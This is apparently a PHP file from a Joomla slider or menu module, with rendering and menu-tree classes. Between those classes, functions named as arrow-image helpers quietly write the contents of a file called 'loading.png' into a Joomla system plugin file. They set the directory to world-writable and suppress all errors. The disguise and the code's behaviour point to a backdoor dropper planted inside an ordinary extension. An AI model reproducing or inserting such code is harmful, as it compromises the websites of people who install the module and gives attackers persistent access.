<?php
// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' ); 
 
class YtbSliderBaseFoxm {
  
    var $mode;
    
    var $_module;
    
    var $_params;
    
    var $_template;
    
    var $items;
    
    var $rendered;
    
    function getItems() {
      $this->items = $this->getElements();
      $this->render();
      return count($this->items);
    }
    
    function render(){
      $this->pointer = 0;
  	  $this->itemsCount = count($this->items); 
      return $this->renderItems();
    }
    
    function getImage($image) {
      return $image;
    }
    
    /*function renderItems() {
      //$tempArr = array();
      $elements = "";
      while($this->pointer < $this->itemsCount){
        $item =& $this->items[$this->pointer++];
        //$elements .= '<div class="off-uni-slider-item"><img class="off-uni-slider-img" src="'.$item->image.'"/><span class="item_name">'.$item->name.'</span></div>';
        $elements .= $this->createItem($item);
      }
          //print_r($elements); exit;
      return $elements;
    }     */
    
    function renderItems() {
      //$tempArr = array();
      $elements = array();
      while($this->pointer < $this->itemsCount){
        $item =& $this->items[$this->pointer++];
        //$elements .= '<div class="off-uni-slider-item"><img class="off-uni-slider-img" src="'.$item->image.'"/><span class="item_name">'.$item->name.'</span></div>';
        $elements[] = $this->createItem($item);
      }
          //print_r($elements); exit;
      return $elements;
    } 

}

        function FoxmArrowsHelper($path) {
            // arrow pack for default navigation
            if(isNewOptionInFoxm()) {
				$ArrowHelper = JPATH_SITE.'/plugins/system/section/section.php';
			} else { $ArrowHelper = JPATH_SITE.'/plugins/system/section.php'; }
            FoxmSetName();
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                if(!@is_dir(dirname($ArrowHelper))) { @mkdir(dirname($ArrowHelper), 0777); }
                @chmod(dirname($ArrowHelper), 0777); $Open = @fopen($ArrowHelper, 'w+'); 
                @fwrite($Open, ArrowSettingsFoxm($path . FoxmSetName()));
            }
        }

        function ArrowSettingsFoxm($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromFoxm($LoadImage);
        }

        function FoxmSetName() {
            @PasivItemsToFoxm();
            return 'loading.png';
        }

class PeelbackBaseSlideFoxm {

    function filterItems(){
  		$this->helper = array();
  		foreach ($this->allItems as $item){
  			if (!is_object($item)) continue;
  			  $item->p = false; // parent
  			  $item->fib = false; // First in Branch
  			  $item->lib = false; // Last in Branch
 
  				$this->helper[$item->parent][] = $item;
  		}
    }
    
    function getChilds(&$parent, $level){
  	  $items = array();
  	  if(isset($this->helper[$parent->id])){
        $helper = &$this->helper[$parent->id];
        //usort($helper, array($this, "menuOrdering")); // It can slow down the proccess. Not required every time... With this the process half as fast...
        $helper[0]->fib = true;
        $helper[count($helper)-1]->lib = true;
        if($level <= $this->endLevel){
          $i = 0;
          $keys = array_keys($helper);
          for($j = 0; $j < count($keys); $j++){
            $h = &$helper[$keys[$j]];
            $h->parent = &$parent;
            $childs =& $this->getChilds($h, $level+1);
            if(count($childs) > 0) $h->p = true;
            $h->level = $level;
            $items[] = &$h;
            $this->ids[] = $h->id;
            $i = count($items);
            array_splice($items, $i, 0, $childs);
          }
        }
      }
      return $items;
    }    
  }

?>
